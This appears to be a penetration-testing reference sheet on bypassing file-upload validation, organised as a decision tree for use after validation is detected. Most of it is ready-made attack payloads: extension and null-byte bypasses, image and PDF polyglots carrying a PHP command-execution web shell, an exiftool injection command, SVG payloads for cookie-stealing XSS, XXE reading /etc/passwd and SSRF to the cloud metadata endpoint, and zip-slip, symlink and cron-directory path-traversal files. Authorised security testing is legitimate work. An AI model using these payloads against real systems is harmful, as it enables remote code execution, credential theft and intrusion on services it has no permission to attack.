# File Upload Bypass Techniques

## When to Use

Consult when Phase 2 detects validation on file uploads. Contains specific bypass methods for each validation type.

---

## Extension Bypass

### Case Variation
```
.pHp, .PhP, .pHP, .Php
.aSp, .aSpX
.jSp, .jSpX
```

### Double Extensions
```
file.php.jpg        (Apache may process as PHP if misconfigured)
file.php.png
file.jpg.php        (processed as PHP — extension is last)
file.php5.jpg
```

### Null Byte (older systems)
```
file.php%00.jpg     (URL-encoded null byte)
file.php\x00.jpg    (literal null byte)
file.php\0.jpg
```

### Alternative Extensions

**PHP:** `.php3`, `.php4`, `.php5`, `.php7`, `.pht`, `.phtml`, `.phps`, `.phar`, `.phpt`, `.pgif`, `.shtml`, `.inc`

**ASP:** `.asp`, `.aspx`, `.cer`, `.asa`, `.ashx`, `.asmx`, `.ascx`

**JSP:** `.jsp`, `.jspx`, `.jsw`, `.jsv`, `.jspf`, `.wss`, `.do`, `.action`

**Perl:** `.pl`, `.pm`, `.cgi`

**Other:** `.config` (IIS), `.cfm` (ColdFusion), `.py` (if Python CGI)

### Trailing Characters
```
file.php.           (trailing dot)
file.php%20         (trailing space)
file.php;.jpg       (semicolon — IIS)
file.php:jpg        (colon — alternate data stream on Windows)
file.php::$DATA     (Windows NTFS alternate data stream)
```

### Encoding
```
file.%70%68%70      (URL-encoded "php")
file.p%68p          (partial encoding)
```

---

## Content-Type Bypass

### Mismatch Attack
Upload PHP file but set Content-Type header to allowed type:
```
Content-Type: image/jpeg      (but file content is PHP)
Content-Type: image/png
Content-Type: image/gif
Content-Type: application/pdf
```

Many servers check Content-Type header but not actual file content.

---

## Magic Bytes Bypass

### Polyglot Files
Prepend valid file header before malicious content:

**GIF + PHP:**
```
GIF89a
<?php system($_GET['cmd']); ?>
```

**PNG + PHP:**
```
\x89PNG\r\n\x1a\n
<?php system($_GET['cmd']); ?>
```

**JPEG + PHP (in EXIF comment):**
Use `exiftool` to inject PHP into JPEG metadata:
```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg image.php.jpg
```

**PDF + PHP:**
```
%PDF-1.4
<?php system($_GET['cmd']); ?>
```

---

## SVG Exploitation

### XSS via SVG
```xml
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
  <rect width="100" height="100"/>
</svg>
```

### XXE via SVG
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&xxe;</text>
</svg>
```

### SSRF via SVG
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://169.254.169.254/latest/meta-data/" width="100" height="100"/>
</svg>
```

---

## ZIP/Archive Exploitation

### Zip Slip (Path Traversal)
Create ZIP with entries containing `../../` paths:
```bash
python3 -c "
import zipfile
with zipfile.ZipFile('evil.zip','w') as z:
    z.writestr('../../../tmp/evil.txt','pwned')
"
```

### Symlink Attack
```bash
ln -s /etc/passwd symlink.txt
zip --symlinks evil.zip symlink.txt
```
If the server extracts and serves the symlink, it reads the linked file.

---

## Filename-Based Path Traversal
```
../../../etc/cron.d/evil
..%2f..%2f..%2fetc%2fcron.d%2fevil
....//....//....//etc/cron.d/evil
```

---

## Bypass Decision Tree

```
Upload blocked →
├── Extension blocked? → Try alternative extensions, double extensions, null byte
├── Content-Type checked? → Mismatch Content-Type header
├── Magic bytes checked? → Polyglot file (valid header + malicious content)
├── File content scanned? → Obfuscate payload, use encoding, inject into metadata
├── SVG allowed? → XSS/XXE/SSRF via SVG
└── Archives allowed? → Zip slip, symlink attack
```
